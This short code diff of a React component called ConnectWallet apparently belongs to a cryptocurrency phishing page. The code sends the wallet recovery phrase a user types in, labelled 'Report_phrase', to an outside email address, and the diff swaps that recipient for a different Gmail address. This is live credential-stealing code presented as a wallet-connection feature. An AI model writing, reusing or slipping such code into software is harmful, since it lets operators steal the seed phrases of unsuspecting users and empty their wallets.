@@ -99,7 +99,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "instantbank@yahoo.com"
+        "alliantcreditbank@gmail.com"
       )
         .then(() => {
           setValue({
